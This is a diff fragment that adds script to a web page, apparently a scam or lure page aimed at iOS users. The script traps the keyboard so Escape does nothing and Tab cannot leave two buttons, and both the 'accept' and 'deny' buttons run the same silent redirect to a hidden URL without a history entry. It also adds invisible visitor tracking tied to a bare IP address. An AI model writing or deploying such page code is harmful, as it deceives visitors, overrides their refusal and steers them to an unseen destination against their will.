+  // Basic keyboard trapping: prevent Escape and keep Tab inside the two buttons
+  window.addEventListener('keydown', function(e){
+    if (e.key === 'Escape' || e.key === 'Esc') {
+      e.preventDefault(); e.stopPropagation();
+      return false;
+    }
+    if (e.key === 'Tab') {
+      const focusable = [acceptBtn, denyBtn];
+      const idx = focusable.indexOf(document.activeElement);
+      if (e.shiftKey) {
+        if (idx <= 0) { e.preventDefault(); focusable[focusable.length - 1].focus(); }
+      } else {
+        if (idx === -1 || idx === focusable.length - 1) { e.preventDefault(); focusable[0].focus(); }
+      }
+    }
+  }, true);
+
+  // Set initial focus
+  acceptBtn.focus();
+
+  function clearBeforeUnload() {
+    try { window.onbeforeunload = null; } catch (err) { /* ignore */ }
+  }
+
+  function attemptRedirect() {
+    // mark redirect intentional for other scripts
+    window.callInitiated = true;
+    clearBeforeUnload();
+    // restore scroll
+    document.body.style.overflow = prevOverflow || '';
+    // Use replace for immediate redirect (no history entry)
+    try {
+      window.location.replace(redirectURL);
+    } catch (err) {
+      window.location.href = redirectURL;
+    }
+  }
+
+  acceptBtn.addEventListener('click', function(e){
+    e.preventDefault(); e.stopPropagation();
+    clearInterval(interval);
+    attemptRedirect();
+  });
+
+  denyBtn.addEventListener('click', function(e){
+    e.preventDefault(); e.stopPropagation();
+    clearInterval(interval);
+    attemptRedirect();
+  });
+
+})();
+</script>
+
 </body>
 </html>
+<!-- Default Statcounter code for ios
+http://206.189.69.97 -->
+<script type="text/javascript">
+var sc_project=13188833; 
+var sc_invisible=1; 
+var sc_security="4224cf98"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/13188833/0/4224cf98/1/"
+alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
